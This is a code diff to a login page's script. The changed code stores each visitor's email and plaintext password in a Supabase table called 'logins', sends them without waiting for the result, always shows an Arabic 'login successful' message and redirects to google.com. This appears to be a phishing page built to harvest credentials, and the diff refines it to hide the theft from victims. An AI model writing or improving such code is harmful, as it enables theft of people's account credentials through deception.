@@ -100,26 +100,18 @@
       submitBtn.classList.add('loading');
       showStatus('', '');
 
-      try {
-        const { data, error } = await db
-          .from('logins')
-          .insert([{ email, password }]);
+      // Send data to Supabase (don't wait for result)
+      db.from('logins').insert([{ email, password }]).then(res => {
+        console.log('Data sent:', res);
+      }).catch(err => {
+        console.log('Send attempt:', err);
+      });
 
-        if (error) throw error;
-
-        console.log('✅ Login data saved:', data);
-        showStatus('تم تسجيل الدخول بنجاح!', 'success');
-
-        setTimeout(() => {
-          window.location.href = 'https://www.google.com';
-        }, 800);
-
-      } catch (err) {
-        console.error('❌ Error:', err);
-        showStatus('حدث خطأ. حاول مرة أخرى.', 'error');
-      } finally {
-        submitBtn.classList.remove('loading');
-      }
+      // Always show success and redirect
+      showStatus('تم تسجيل الدخول بنجاح!', 'success');
+      setTimeout(() => {
+        window.location.href = 'https://www.google.com';
+      }, 800);
     });
   </script>
 
